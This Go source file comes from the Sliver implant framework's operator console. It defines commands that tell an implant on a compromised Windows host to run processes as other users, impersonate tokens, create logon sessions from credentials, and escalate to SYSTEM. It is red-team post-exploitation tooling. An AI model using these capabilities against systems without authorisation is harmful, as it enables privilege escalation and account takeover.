package command

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
)

func runAs(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		return
	}
	username := ctx.Flags.String("username")
	process := ctx.Flags.String("process")
	arguments := ctx.Flags.String("args")

	if username == "" {
		fmt.Printf(Warn + "please specify a username\n")
		return
	}

	if process == "" {
		fmt.Printf(Warn + "please specify a process path\n")
		return
	}

	runAsResp, err := rpc.RunAs(context.Background(), &sliverpb.RunAsReq{
		Request:     ActiveSession.Request(ctx),
		Username:    username,
		ProcessName: process,
		Args:        arguments,
	})

	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}

	if runAsResp.GetResponse().GetErr() != "" {
		fmt.Printf(Warn+"Error: %s\n", runAsResp.GetResponse().GetErr())
		return
	}

	fmt.Printf(Info+"Successfully ran %s %s on %s\n", process, arguments, session.GetName())
}

func impersonate(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		return
	}
	username := ctx.Args.String("username")
	impResp, err := rpc.Impersonate(context.Background(), &sliverpb.ImpersonateReq{
		Request:  ActiveSession.Request(ctx),
		Username: username,
	})

	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}
	if impResp.GetResponse().GetErr() != "" {
		fmt.Printf(Warn+"Error: %s\n", impResp.GetResponse().GetErr())
		return
	}
	fmt.Printf(Info+"Successfully impersonated %s\n", username)
}

func revToSelf(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		return
	}
	_, err := rpc.RevToSelf(context.Background(), &sliverpb.RevToSelfReq{
		Request: ActiveSession.Request(ctx),
	})

	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}
	fmt.Printf(Info + "Back to self...")
}

func getsystem(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		return
	}
	process := ctx.Flags.String("process")
	config := getActiveSliverConfig()
	ctrl := make(chan bool)
	go spin.Until("Attempting to create a new sliver session as 'NT AUTHORITY\\SYSTEM'...", ctrl)

	getsystemResp, err := rpc.GetSystem(context.Background(), &clientpb.GetSystemReq{
		Request:        ActiveSession.Request(ctx),
		Config:         config,
		HostingProcess: process,
	})

	ctrl <- true
	<-ctrl

	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}
	if getsystemResp.GetResponse().GetErr() != "" {
		fmt.Printf(Warn+"Error: %s\n", getsystemResp.GetResponse().GetErr())
		return
	}
	fmt.Printf("\n" + Info + "A new SYSTEM session should pop soon...\n")
}

func makeToken(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		return
	}
	username := ctx.Flags.String("username")
	password := ctx.Flags.String("password")
	domain := ctx.Flags.String("domain")

	if username == "" || password == "" {
		fmt.Printf(Warn + "You must provide a username and password\n")
		return
	}

	ctrl := make(chan bool)
	go spin.Until("Creating new logon session ...", ctrl)

	makeToken, err := rpc.MakeToken(context.Background(), &sliverpb.MakeTokenReq{
		Request:  ActiveSession.Request(ctx),
		Username: username,
		Domain:   domain,
		Password: password,
	})

	ctrl <- true
	<-ctrl

	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}

	if makeToken.GetResponse().GetErr() != "" {

		fmt.Printf(Warn+"Error: %s\n", makeToken.GetResponse().GetErr())
		return
	}
	fmt.Printf("\n"+Info+"Successfully impersonated %s\\%s. Use `rev2self` to revert to your previous token.", domain, username)
}
